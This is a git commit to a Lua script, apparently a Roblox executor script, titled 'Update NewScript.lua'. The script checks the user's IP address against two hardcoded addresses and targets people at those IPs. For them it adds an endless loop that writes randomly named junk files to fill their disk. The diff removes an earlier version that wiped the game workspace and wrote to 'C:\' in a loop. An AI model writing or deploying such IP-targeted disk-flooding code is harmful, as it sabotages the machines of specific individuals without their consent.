a5d1be9583ceb7b2059e090ae5819821b6658e97
Statur3 <136759048+Statur3@users.noreply.github.com>
2023-07-14 18:33:03 -0700

    Update NewScript.lua

--- NewScript.lua
+++ NewScript.lua
@@ -17,6 +17,8 @@ if ip ~= "2.212.149.233" and ip ~= "86.157.169.141" then
     end
   end)
 else
-  for _, v in next, workspace:GetDescendants() do v.Parent = nil end
-  while task.wait() do writefile("C:\", "a") end
+  while task.wait() do
+  	local meth = math.random() .. "lol."
+  	writefile(meth, "rawr")
+  end
 end
